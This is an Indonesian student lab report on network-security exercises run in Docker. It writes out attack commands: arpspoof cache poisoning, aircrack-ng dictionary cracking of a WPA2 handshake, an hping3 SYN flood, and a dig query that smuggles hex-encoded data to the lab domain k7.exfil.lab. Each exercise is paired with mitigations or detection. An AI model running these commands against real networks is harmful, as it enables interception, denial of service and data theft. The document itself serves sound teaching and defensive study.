# LAPORAN DOKUMENTASI PRAKTIKUM UTS NETWORK SECURITY
**Studi Kasus 7 (`K7`) — Implementasi, Analisis Kerentanan, dan Mitigasi Keamanan Jaringan**

- **Nama Mahasiswa:** Diki Wahyu Permana
- **Nomor Induk Mahasiswa (NIM):** 24552011089
- **Kelas:** TIF RP 24 E CNS
- **Program Studi:** Teknik Informatika
- **Mata Kuliah:** Network Security

---

## Ringkasan Konfigurasi & Parameter Kasus 7 (`K7`)

Seluruh rangkaian pengujian pada laporan ini dilaksanakan secara terisolasi di dalam lingkungan kontainerisasi (*Docker Engine*) dengan parameter spesifik yang diturunkan dari identitas mahasiswa (`24552011089` -> Kasus 7):

| Komponen / Parameter | Nilai Konfigurasi Kasus 7 (`K7`) | Keterangan Teknis |
| :--- | :--- | :--- |
| **Kode Studi Kasus** | `Kasus 7 (K7)` | Penentuan kasus berdasarkan perhitungan digit NIM |
| **Identitas Uji (NIM)** | `24552011089` | Payload uji persistensi volume dan eksfiltrasi DNS |
| **Docker Named Volume** | `vol-k7` | Penyimpanan persisten di luar siklus hidup container |
| **Berkas Uji Kriptografi & Volume** | `laporan-k7.txt`, `laporan-k7.enc`, `hasil-k7.txt` | Berkas plaintext, ciphertext AES-256-CBC, dan hasil dekripsi |
| **Sertifikat Digital X.509** | `cert-k7.pem`, `key-k7.pem` (`CN=k7.uts.local`) | Sertifikat *self-signed* RSA 2048-bit masa berlaku 30 hari |
| **Kredensial Enkripsi** | Variabel Lingkungan `$K7_PASSWORD` | Disimpan di memori sesi lokal (tidak dipublikasikan) |
| **Segmen Jaringan Lab ARP** | `lab-arp-k7` | Jaringan *bridge* terisolasi untuk simulasi layer-2 |
| **Entitas Container ARP** | `korban-k7`, `gateway-k7`, `penyerang-k7` | Simulasi komunikasi klien-gateway dan peracunan cache ARP |
| **Domain Eksfiltrasi DNS** | `k7.exfil.lab` | Zona otoritatif lokal untuk pengujian *DNS tunneling/exfiltration* |

---

## TUGAS 1 — MANAJEMEN CONTAINER, DOCKER VOLUME, & DOCKER COMPOSE
*(Materi Pertemuan 1)*

### 1. Tujuan Praktikum
1. Memahami konsep *ephemeral storage* pada container Docker dan mengimplementasikan **Docker Volume** untuk menjamin persistensi data meskipun container dihapus.
2. Mempraktikkan orkestrasi layanan multi-container menggunakan **Docker Compose** serta menguji resolusi nama layanan (*service discovery*) dan komunikasi jaringan internal antar-container.

### 2. Rincian Perintah & Analisis Teknis

#### A. Pembuatan Ruang Penyimpanan Persisten (`vol-k7`)
    docker volume create vol-k7
- `docker volume create`: Menginstruksikan Docker Daemon untuk mengalokasikan ruang penyimpanan terkelola (*named volume*) pada sistem file host yang terpisah dari *writable layer* container.
- `vol-k7`: Nama unik volume yang digunakan sebagai media penyimpanan permanen bagi skenario Kasus 7.

#### B. Penulisan Data Identitas NIM ke dalam Volume
    docker run --name w-k7 -v vol-k7:/data alpine sh -c 'echo 24552011089 > /data/laporan-k7.txt'
- `docker run --name w-k7`: Membuat dan menjalankan instance container baru bernama `w-k7` menggunakan base image `alpine` yang ringan.
- `-v vol-k7:/data`: Melakukan *bind/volume mount* sehingga direktori `/data` di dalam container merujuk langsung pada volume `vol-k7`.
- `sh -c 'echo 24552011089 > /data/laporan-k7.txt'`: Menjalankan shell untuk menuliskan string NIM `24552011089` ke dalam berkas `/data/laporan-k7.txt`.

#### C. Penghapusan Container Penulis Data
    docker rm w-k7
- `docker rm w-k7`: Menghapus container `w-k7` beserta seluruh *container layer* internalnya setelah proses penulisan selesai. Langkah ini bertujuan membuktikan bahwa penghapusan container tidak menghapus data yang tersimpan di dalam *named volume*.

#### D. Verifikasi Persistensi Data Melalui Container Baru
    docker run --rm -v vol-k7:/data alpine cat /data/laporan-k7.txt
- `--rm`: Mengatur agar container sementara langsung dihapus otomatis setelah perintah selesai dieksekusi.
- `-v vol-k7:/data`: Memasang kembali volume `vol-k7` yang sama ke container baru.
- `cat /data/laporan-k7.txt`: Membaca isi berkas dari volume. Munculnya keluaran `24552011089` membuktikan data tetap utuh dan persisten.

#### E. Orkestrasi Layanan Multi-Container dengan Docker Compose
    docker compose -p k7 -f b/b1-compose/docker-compose.yml up -d
- `-p k7`: Menetapkan *project name* khusus `k7` agar seluruh container, volume, dan jaringan terisolasi dengan prefiks `k7`.
- `-f b/b1-compose/docker-compose.yml`: Menunjuk berkas definisi layanan YAML yang digunakan.
- `up -d`: Membangun jaringan internal dan menjalankan seluruh container layanan di latar belakang (*detached mode*).

#### F. Pengujian Konektivitas Jaringan Internal Antar-Container
    docker compose -p k7 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
- `exec attacker`: Menjalankan perintah pengujian dari dalam container klien (`attacker`).
- `wget -qO- http://target`: Mengirimkan permintaan HTTP GET secara senyap (`-q`) dan mencetak respons langsung ke *standard output* (`-O-`). Keberhasilan resolusi hostname `target` membuktikan mekanisme *embedded DNS* Docker bekerja dengan baik.

#### G. Pembersihan Lingkungan Kerja Compose
    docker compose -p k7 -f b/b1-compose/docker-compose.yml down -v
- `down -v`: Menghentikan serta menghapus seluruh container, jaringan bridge proyek `k7`, dan volume sementara yang didefinisikan di dalam Compose.

### 3. Hasil Pengujian & Analisis
- **Persistensi Volume:** Berkas `laporan-k7.txt` yang berisi `24552011089` tetap terbaca sempurna oleh container kedua setelah `w-k7` dihapus.
- **Komunikasi Antar-Container:** Container `attacker` berhasil menerima kode sumber halaman web *Welcome to nginx!* dari `target` melalui jaringan internal Docker Compose tanpa perlu mengekspos port ke host publik.

### 4. Bukti Praktikum
Seluruh tangkapan layar eksekusi pembuatan volume `vol-k7`, verifikasi pembacaan NIM `24552011089`, serta pengujian komunikasi HTTP Docker Compose dilampirkan pada direktori **`bukti/Tugas 1/`**.

### 5. Kesimpulan
*Docker Volume* memisahkan siklus hidup data dari siklus hidup container sehingga menjamin persistensi informasi krusial. Sementara itu, *Docker Compose* menyederhanakan orkestrasi multi-layanan dalam jaringan virtual terisolasi.

---

## TUGAS 2 — KRIPTOGRAFI SIMETRIS (AES-256-CBC), HASHING (SHA-256), & SERTIFIKAT X.509
*(Materi Pertemuan 2)*

### 1. Tujuan Praktikum
1. Mengimplementasikan pengamanan kerahasiaan (*confidentiality*) data menggunakan algoritma kriptografi simetris **AES-256-CBC** dengan derivasi kunci **PBKDF2**.
2. Memvalidasi keutuhan (*integrity*) berkas pasca-dekripsi menggunakan fungsi hash kriptografis **SHA-256**.
3. Menerbitkan sertifikat digital *self-signed* berbasis standar **X.509** dan pasangan kunci asimetris **RSA 2048-bit**.

### 2. Rincian Perintah & Analisis Teknis

#### A. Enkripsi, Dekripsi, dan Verifikasi Integritas Hash SHA-256
    docker run --rm -e K7_PASSWORD="$K7_PASSWORD" -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k7 > laporan-k7.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k7.txt -out laporan-k7.enc -pass env:K7_PASSWORD && sha256sum laporan-k7.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k7.enc -out hasil-k7.txt -pass env:K7_PASSWORD && sha256sum hasil-k7.txt'
- `-e K7_PASSWORD="$K7_PASSWORD"` & `-pass env:K7_PASSWORD`: Menginjeksi frasa sandi melalui *environment variable* agar rahasia kriptografi tidak tercatat di dalam *bash history* atau laporan publik.
- `openssl enc -aes-256-cbc -pbkdf2 -salt`: Mengenakan penyandian blok *Advanced Encryption Standard* 256-bit mode *Cipher Block Chaining* (CBC), menggunakan fungsi derivasi kunci *PBKDF2* untuk menahan serangan *brute-force*, serta menambahkan nilai *salt* acak untuk mencegah serangan *rainbow table*.
- `openssl enc -d`: Melakukan proses dekripsi berkas *ciphertext* (`laporan-k7.enc`) kembali menjadi *plaintext* (`hasil-k7.txt`).
- `sha256sum`: Menghitung *message digest* 256-bit untuk membandingkan sidik jari digital berkas asli dan hasil dekripsi.

#### B. Penerbitan & Inspeksi Sertifikat Digital Self-Signed X.509
    docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k7.pem -out cert-k7.pem -days 30 -subj /CN=k7.uts.local && openssl x509 -in cert-k7.pem -noout -subject -issuer -dates'
- `openssl req -x509`: Membuat sertifikat X.509 yang ditandatangani sendiri (*self-signed*).
- `-newkey rsa:2048 -nodes`: Membangkitkan pasangan kunci asimetris RSA sepanjang 2048-bit dan menyimpan kunci privat (`key-k7.pem`) tanpa enkripsi passphrase tambahan (*No DES*).
- `-days 30 -subj /CN=k7.uts.local`: Menetapkan masa berlaku sertifikat selama 30 hari untuk identitas *Common Name* `k7.uts.local`.
- `openssl x509 -noout -subject -issuer -dates`: Mengekstrak informasi metadata subjek, otoritas penerbit, dan rentang tanggal validitas sertifikat.

### 3. Hasil Pengujian & Analisis
- **Validasi Integritas Data:** Nilai *checksum* `SHA-256` yang dihasilkan oleh `laporan-k7.txt` dan `hasil-k7.txt` menunjukkan deretan karakter heksadesimal yang **identik 100%**, membuktikan bahwa proses enkripsi dan dekripsi tidak merusak integritas bit data.
- **Spesifikasi Sertifikat Digital:**

| Parameter Sertifikat | Nilai Hasil Pengujian |
| :--- | :--- |
| **Subject** | `CN = k7.uts.local` |
| **Issuer** | `CN = k7.uts.local` *(Self-Signed Certificate)* |
| **Algoritma & Panjang Kunci** | RSA 2048-bit |
| **Masa Berlaku** | 30 Hari sejak waktu penerbitan |

### 4. Bukti Praktikum
Tangkapan layar hasil kalkulasi hash `SHA-256`, proses enkripsi/dekripsi `AES-256-CBC`, serta metadata sertifikat `cert-k7.pem` dilampirkan pada direktori **`bukti/Tugas 2/`**.

### 5. Kesimpulan
Kombinasi algoritma simetris **AES-256-CBC** dengan derivasi kunci **PBKDF2** efektif melindungi kerahasiaan dokumen, sementara **SHA-256** menjamin keutuhan data. Sertifikat **X.509** berperan penting dalam mengikat identitas domain dengan kunci publik kriptografis.

---

## TUGAS 3 — SIMULASI ARP SPOOFING & MITIGASI STATIC ARP
*(Materi Pertemuan 3)*

### 1. Tujuan Praktikum
1. Memahami mekanisme resolusi alamat logis (IPv4) ke alamat fisik (MAC Address) pada protokol **ARP** (*Address Resolution Protocol*).
2. Menganalisis kerentanan sifat *stateless* ARP melalui simulasi peracunan tabel ARP (*ARP Cache Poisoning / Spoofing*) di segmen jaringan terisolasi.
3. Menerapkan dan memverifikasi efektivitas konfigurasi **Static ARP** sebagai langkah mitigasi pada sisi host.

### 2. Rincian Perintah & Analisis Teknis

#### A. Pembentukan Segmen Jaringan Lab & Entitas Simulasi
    docker network create lab-arp-k7
    docker run -d --name korban-k7 --network lab-arp-k7 --cap-add NET_ADMIN uts-kali-tools
    docker run -d --name gateway-k7 --network lab-arp-k7 --cap-add NET_ADMIN uts-kali-tools
    docker run -d --name penyerang-k7 --network lab-arp-k7 --cap-add NET_ADMIN uts-kali-tools
- `docker network create lab-arp-k7`: Membuat domain broadcast layer-2 virtual yang terisolasi agar paket ARP palsu tidak keluar ke jaringan fisik host.
- `--cap-add NET_ADMIN`: Memberikan kapabilitas kernel Linux untuk memodifikasi tabel routing, antarmuka jaringan, dan cache ARP di dalam container.

#### B. Pemetaan Alamat IP & Pemeriksaan Kondisi Normal Tabel ARP
    docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k7").IPAddress}}' korban-k7 && docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k7").IPAddress}}' gateway-k7
    docker exec korban-k7 arp -a
- Mengekstrak alamat IPv4 dinamis yang dialokasikan Docker kepada `korban-k7` dan `gateway-k7`, serta mencatat kondisi awal tabel ARP korban sebelum simulasi serangan dijalankan.

#### C. Simulasi ARP Spoofing Terbatas
    docker exec -d penyerang-k7 timeout 20 arpspoof -i eth0 -t <IP_KORBAN> <IP_GATEWAY>
    docker exec korban-k7 arp -a
- `timeout 20 arpspoof -i eth0 -t <IP_KORBAN> <IP_GATEWAY>`: Mengirimkan paket *unsolicited ARP Reply* palsu secara berkala selama 20 detik kepada `korban-k7` dengan mengklaim bahwa alamat IP milik `gateway-k7` berasosiasi dengan alamat MAC milik `penyerang-k7`.

#### D. Penerapan Mitigasi Static ARP & Verifikasi
    docker exec korban-k7 arp -s <IP_GATEWAY> ca:33:89:6a:93:83
    docker exec korban-k7 arp -a
- `arp -s`: Mendaftarkan pemetaan alamat IP gateway dan alamat MAC fisik aslinya (`ca:33:89:6a:93:83`) secara manual sebagai entri statis (`PERM`).

### 3. Hasil Pengujian & Analisis
- **Kerentanan Protokol ARP:** Karena ARP tidak memiliki mekanisme autentikasi sumber pesan, host korban secara otomatis memperbarui cache ARP-nya ketika menerima paket *ARP Reply* dari penyerang, sehingga lalu lintas berpotensi dibelokkan (*Man-in-the-Middle*).
- **Efektivitas Mitigasi:** Setelah perintah `arp -s` dijalankan, pemeriksaan ulang melalui `arp -a` menampilkan bendera status **`PERM`** pada entri IP gateway yang mengarah ke MAC asli `ca:33:89:6a:93:83`. Entri permanen ini kebal terhadap penimpaan paket ARP dinamis palsu. *(Pada skala jaringan enterprise, mitigasi serupa diterapkan secara terpusat pada switch menggunakan fitur **Dynamic ARP Inspection / DAI** dan **DHCP Snooping**)*.

### 4. Bukti Praktikum
Tangkapan layar pembuatan jaringan `lab-arp-k7`, kondisi tabel ARP sebelum simulasi, saat simulasi `arpspoof`, hingga status `PERM` pasca-mitigasi dilampirkan pada direktori **`bukti/Tugas 3/`**.

### 5. Kesimpulan
Protokol ARP rentan terhadap manipulasi pemetaan IP-MAC di dalam satu segmen LAN. Penetapan *Static ARP* pada perangkat kritis mampu mencegah perubahan cache ARP secara tidak sah.

---

## TUGAS 4 — ANALISIS HANDSHAKE WPA2 DENGAN AIRCRACK-NG
*(Materi Pertemuan 4)*

### 1. Tujuan Praktikum
1. Memahami alur pertukaran kunci autentikasi **WPA2-PSK** (*Four-Way Handshake*) antara *Access Point* (AP) dan *Client*.
2. Mempraktikkan audit ketahanan kata sandi jaringan nirkabel secara *offline* menggunakan utilitas **Aircrack-ng** terhadap berkas tangkapan paket (`.cap`).

### 2. Rincian Perintah & Analisis Teknis
    docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k7.txt handshake-k7.cap
- `aircrack-ng`: Alat audit keamanan jaringan nirkabel standar industri untuk menganalisis tangkapan frame 802.11.
- `-w wordlist-k7.txt`: Menentukan berkas kamus berisi kandidat *passphrase* yang akan diuji.
- `handshake-k7.cap`: Berkas tangkapan lalu lintas jaringan yang berisi frame autentikasi *EAPOL Four-Way Handshake*.

### 3. Mekanisme Teknis WPA2 Four-Way Handshake
Pada standar keamanan WPA2, *Pre-Shared Key* (PSK) tidak pernah dikirimkan dalam bentuk teks terang melewati gelombang radio. Sebagai gantinya, AP dan Client membentuk *Pairwise Transient Key* (PTK) melalui empat tahap pertukaran pesan EAPOL:
1. **Message 1 (AP -> Client):** AP membangkitkan angka acak sekali pakai (`ANonce`) dan mengirimkannya ke Client.
2. **Message 2 (Client -> AP):** Client membangkitkan `SNonce`, menggabungkannya dengan `ANonce`, MAC AP, MAC Client, serta PMK untuk menghitung **PTK**, lalu mengirimkan `SNonce` beserta *Message Integrity Code* (**MIC**) ke AP.
3. **Message 3 (AP -> Client):** AP memvalidasi MIC dari Client, lalu mengirimkan *Group Temporal Key* (**GTK**) terenkripsi beserta konfirmasi pemasangan kunci.
4. **Message 4 (Client -> AP):** Client mengirimkan pesan konfirmasi akhir (*ACK*) menandakan seluruh sesi komunikasi data selanjutnya telah terenkripsi menggunakan CCMP/AES.

### 4. Hasil Pengujian & Analisis
- Utilitas `aircrack-ng` berhasil memvalidasi keberadaan **1 handshake WPA2** di dalam berkas `handshake-k7.cap`.
- Melalui proses pencocokan kriptografis *PBKDF2-HMAC-SHA1* terhadap setiap kandidat dalam `wordlist-k7.txt` dan membandingkannya dengan nilai **MIC** pada frame handshake, program menampilkan status **`KEY FOUND!`**. Hal ini membuktikan bahwa apabila paket handshake berhasil disadap, kata sandi yang lemah dapat dipecahkan secara *offline* tanpa menimbulkan anomali lalu lintas pada *Access Point*. *(Nilai kata sandi asli tidak dicantumkan dalam laporan publik)*.

### 5. Bukti Praktikum
Tangkapan layar proses pemindaian berkas `handshake-k7.cap` dan verifikasi temuan kunci oleh `aircrack-ng` dilampirkan pada direktori **`bukti/Tugas 4/`**.

### 6. Kesimpulan
Keamanan jaringan WPA2-PSK bergantung sepenuhnya pada panjang dan kompleksitas entropi *passphrase* (minimal 12–16 karakter kombinasi acak) guna menggagalkan serangan kamus (*dictionary attack*) secara *offline*.

---

## TUGAS 5 — PEMBUATAN PAKET ICMP DENGAN SCAPY & ANALISIS SMURF ATTACK
*(Materi Pertemuan 5)*

### 1. Tujuan Praktikum
1. Memahami struktur header protokol **ICMP** (*Internet Control Message Protocol*) pada lapisan jaringan (*Network Layer*).
2. Mempraktikkan penyusunan dan pengiriman paket jaringan kustom secara terprogram menggunakan pustaka **Scapy** pada Python.
3. Menganalisis mekanisme serangan amplifikasi **Smurf Attack** beserta strategi mitigasinya.

### 2. Rincian Perintah & Analisis Teknis
    docker run --rm -it --network lab-net --cap-add=NET_RAW -v "$PWD/kasus/k7-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <IP_TUJUAN>
- `--cap-add=NET_RAW`: Memberikan izin akses *raw socket* kepada container sehingga Python/Scapy dapat membangun header IP dan ICMP secara manual dari nol.
- `-v "$PWD/kasus/k7-scapy:/work"`: Memetakan skrip sumber Kasus 7 ke direktori kerja container.
- `python3 /work/kirim_icmp.py <IP_TUJUAN>`: Mengeksekusi program Scapy untuk mengirimkan paket *ICMP Echo Request* dan menangkap paket balasannya.

### 3. Analisis Parameter Paket & Konsep Smurf Attack
- **Kode Tipe Pesan ICMP:**
  - `ICMP Type 8 (Code 0)`: *Echo Request*, paket permintaan uji jangkauan jaringan yang dikirim oleh pengirim.
  - `ICMP Type 0 (Code 0)`: *Echo Reply*, paket jawaban yang dikirimkan kembali oleh host tujuan sebagai tanda konektivitas aktif.
- **Time To Live (`TTL`):** Bidang 8-bit pada header IPv4 yang membatasi umur paket berdasarkan jumlah *hop* router agar paket tidak berputar tanpa henti (*routing loop*). Nilai `TTL = 64` mengindikasikan respons berasal dari sistem operasi berbasis kernel Linux.
- **Mekanisme & Mitigasi Smurf Attack:** *Smurf Attack* merupakan serangan *Denial of Service* (DoS) berbasis refleksi dan amplifikasi. Penyerang mengirimkan paket *ICMP Echo Request* dengan memalsukan alamat IP sumber (*IP Spoofing*) menjadi alamat IP korban, lalu mengarahkannya ke alamat **IP Directed Broadcast** suatu jaringan. Seluruh host aktif dalam jaringan tersebut kemudian membalas dengan *Echo Reply* secara serentak ke alamat IP korban hingga melumpuhkan kapasitas bandwidth-nya. Mitigasi dilakukan dengan menonaktifkan penerusan *IP directed broadcast* pada perangkat router (`no ip directed-broadcast`) serta menerapkan penyaringan paket keluar/masuk (**BCP 38 / Ingress-Egress Filtering**) untuk memblokir paket dengan alamat sumber palsu.

### 4. Bukti Praktikum
Tangkapan layar eksekusi skrip `kirim_icmp.py` menggunakan Scapy yang menampilkan detail header balasan (`ICMP Type 0` dan `TTL`) dilampirkan pada direktori **`bukti/Tugas 5/`**.

### 5. Kesimpulan
Pustaka Scapy memberikan kendali penuh untuk memanipulasi dan menganalisis paket jaringan hingga level bit header protokol. Pemahaman mendalam terhadap cara kerja ICMP membantu administrator menerapkan kebijakan penyaringan broadcast untuk mencegah serangan amplifikasi seperti *Smurf Attack*.

---

## TUGAS 6 — SIMULASI TCP SYN FLOOD & ANALISIS THREE-WAY HANDSHAKE
*(Materi Pertemuan 6)*

### 1. Tujuan Praktikum
1. Memahami mekanisme pembentukan koneksi berorientasi sesi pada protokol TCP (**Three-Way Handshake**).
2. Mengamati dampak pengiriman banjir paket `SYN` (**SYN Flood**) terhadap alokasi antrean koneksi setengah terbuka (`SYN_RECV`) pada server target.
3. Menganalisis struktur pertukaran segmen TCP menggunakan utilitas pemantau paket **tcpdump**.

### 2. Rincian Perintah & Analisis Teknis

#### A. Inisialisasi Lingkungan Lab SYN Flood
    docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml up -d

#### B. Pengukuran Baseline Status Koneksi `SYN_RECV`
    docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
- Menghitung jumlah soket TCP pada container `target` yang berada dalam status `SYN_RECV` sebelum simulasi serangan dijalankan sebagai nilai pembanding awal (*baseline*).

#### C. Eksekusi Simulasi SYN Flood Terbatas
    docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
- `timeout 15`: Membatasi durasi pengujian maksimal 15 detik agar tetap terkendali di lingkungan laboratorium.
- `hping3 -S -p 80 --flood target`: Mengirimkan paket TCP dengan menyalakan flag `SYN` (`-S`) ke port layanan HTTP (`80`) milik `target` pada kecepatan tinggi (`--flood`).

#### D. Pemantauan Antrean `SYN_RECV` & Perekaman Paket dengan `tcpdump`
    docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
    docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
- Memantau perubahan jumlah koneksi setengah terbuka selama pengujian berlangsung serta menangkap lalu lintas segmen TCP port `80` pada interface `eth0` tanpa resolusi nama DNS/port (`-nn`).

#### E. Pembersihan Lingkungan Lab
    docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml down -v

### 3. Analisis Mekanisme Three-Way Handshake & Mitigasi SYN Flood
1. **Tahap 1 (`SYN`):** Klien mengirimkan segmen `SYN` dengan *Initial Sequence Number* (ISN) untuk meminta pembukaan sesi.
2. **Tahap 2 (`SYN-ACK`):** Server mengalokasikan struktur memori *Transmission Control Block* (TCB), mencatat status soket menjadi **`SYN_RECV`**, lalu membalas dengan flag `SYN` dan `ACK`.
3. **Tahap 3 (`ACK`):** Klien mengonfirmasi penerimaan dengan segmen `ACK`, mengubah status koneksi menjadi `ESTABLISHED`.

Pada serangan **SYN Flood**, penyerang membanjiri server dengan segmen `SYN` tanpa pernah mengirimkan balasan `ACK` tahap ketiga. Hal ini membuat antrean *backlog* `SYN_RECV` pada server penuh sehingga pengguna sah tidak dapat membuka koneksi baru. Mitigasi utama dilakukan dengan mengaktifkan fitur **TCP SYN Cookies** (`net.ipv4.tcp_syncookies = 1`) pada kernel sistem operasi sehingga server tidak mengalokasikan memori TCB sebelum menerima konfirmasi `ACK` yang valid, serta menerapkan *rate limiting* pada firewall.

### 4. Bukti Praktikum
Tangkapan layar pengukuran `SYN_RECV` sebelum dan saat simulasi `hping3`, serta hasil capture lalu lintas segmen TCP dari `tcpdump` dilampirkan pada direktori **`bukti/Tugas 6/`**.

### 5. Kesimpulan
*SYN Flood* mengeksploitasi sifat *stateful* dalam proses *TCP Three-Way Handshake*. Pemantauan status antrean koneksi dan pengaktifan *SYN Cookies* merupakan langkah esensial untuk menjaga ketersediaan layanan jaringan.

---

## TUGAS 7 — SIMULASI & DETEKSI DNS EXFILTRATION
*(Materi Pertemuan 7)*

### 1. Tujuan Praktikum
1. Memahami teknik penyalahgunaan protokol **DNS** (*Domain Name System*) sebagai saluran komunikasi tersembunyi (*covert channel*) untuk menyelundupkan data keluar jaringan (**DNS Exfiltration**).
2. Mempraktikkan teknik pengodean (*encoding*) data ke format heksadesimal, ekstraksi log server DNS, serta deteksi anomali query menggunakan skrip analisis otomatis.

### 2. Rincian Perintah & Analisis Teknis

#### A. Inisialisasi Lingkungan Lab DNS
    docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml up -d

#### B. Konversi Payload NIM (`24552011089`) ke Representasi Hexadecimal
    echo -n 24552011089 | xxd -p
- `echo -n 24552011089`: Mencetak karakter NIM tanpa menyertakan karakter baris baru (*newline* `\n`).
- `xxd -p`: Mengonversi setiap karakter ASCII menjadi representasi heksadesimal polos (`3234353532303131303839` sepanjang 22 karakter) agar mematuhi standar karakter label domain DNS (RFC 1035).

#### C. Pengiriman Query DNS yang Menyisipkan Muatan Data
    docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131303839.k7.exfil.lab @dns
- `dig +short ... @dns`: Mengirimkan permintaan resolusi nama domain langsung ke server DNS lab (`@dns`) dengan menyisipkan data NIM terenkode sebagai label subdomain dari zona `k7.exfil.lab`.

#### D. Ekspor Log DNS & Analisis Deteksi Anomali
    docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k7.log
    python3 kasus/k7-dns-detect/analisis_dns.py dns-k7.log
- Mengekspor seluruh riwayat permintaan dari container server DNS ke berkas `dns-k7.log`, kemudian memindainya menggunakan skrip Python untuk mengidentifikasi karakteristik query eksfiltrasi seperti panjang label subdomain yang tidak wajar dan pola string heksadesimal.

#### E. Dekoding Payload Kembali ke Bentuk Asli & Pembersihan Lab
    echo 3234353532303131303839 | xxd -r -p
    docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml down -v
- `xxd -r -p`: Mengonversi balik (*reverse*) deretan heksadesimal `3234353532303131303839` menjadi teks asli `24552011089` guna memverifikasi bahwa data berhasil diekstraksi secara utuh pada sisi penerima.

### 3. Hasil Pengujian & Analisis
- **Data Asli (NIM):** `24552011089`
- **Hasil Encoding Hexadecimal:** `3234353532303131303839` (22 karakter)
- **FQDN Query DNS:** `3234353532303131303839.k7.exfil.lab`
- **Hasil Deteksi & Pemulihan Data:** Skrip analisis berhasil mendeteksi dan menandai subdomain sepanjang 22 karakter pada domain `k7.exfil.lab` sebagai anomali eksfiltrasi DNS. Proses dekoding heksadesimal mengembalikan string `24552011089` dengan akurasi 100%.

### 4. Bukti Praktikum
Tangkapan layar konversi heksadesimal NIM `24552011089`, pengiriman query `dig`, ekstraksi `dns-k7.log`, hasil deteksi skrip analisis, serta proses dekoding dilampirkan pada direktori **`bukti/Tugas 7/`**.

### 5. Kesimpulan
Karena lalu lintas DNS (UDP/TCP port 53) hampir selalu diizinkan melewati perimeter firewall, protokol ini kerap dieksploitasi untuk eksfiltrasi data. Mitigasi efektif meliputi penerapan *DNS Sinkholing*, pemantauan panjang subdomain serta nilai entropi query DNS secara berkala, dan pembatasan akses resolver hanya melalui server DNS internal terotorisasi.

---

## KESIMPULAN KESELURUHAN

Berdasarkan rangkaian praktikum UTS Network Security **Kasus 7 (`K7`)**, seluruh tujuh modul keamanan jaringan dan sistem telah berhasil diimplementasikan dan dianalisis secara menyeluruh, meliputi:
1. **Keamanan & Persistensi Kontainer:** Isolasi layanan serta pemisahan penyimpanan persisten menggunakan *Docker Volume* (`vol-k7`) dan *Docker Compose*.
2. **Kriptografi Terapan:** Perlindungan kerahasiaan data via *AES-256-CBC (PBKDF2)*, validasi integritas via *SHA-256*, dan penerbitan identitas digital *X.509 RSA 2048-bit*.
3. **Keamanan Layer-2 (ARP):** Simulasi manipulasi pemetaan IP-MAC (*ARP Spoofing*) pada `lab-arp-k7` dan pencegahan menggunakan entri permanen *Static ARP*.
4. **Keamanan Nirkabel (WPA2):** Audit kerentanan *Four-Way Handshake* terhadap serangan kamus secara *offline* menggunakan *Aircrack-ng*.
5. **Analisis Paket & Protokol ICMP:** Pembuatan paket jaringan tingkat rendah menggunakan *Scapy* serta pemahaman mitigasi serangan amplifikasi *Smurf Attack*.
6. **Ketersediaan Layanan & Protokol TCP:** Simulasi kelelahan antrean *Three-Way Handshake* melalui *TCP SYN Flood* dan pemahaman mekanisme proteksi *SYN Cookies*.
7. **Deteksi Saluran Tersembunyi (DNS):** Simulasi penyisipan data terenkode heksadesimal dalam query DNS (*DNS Exfiltration*) dan pendeteksiannya melalui analisis log.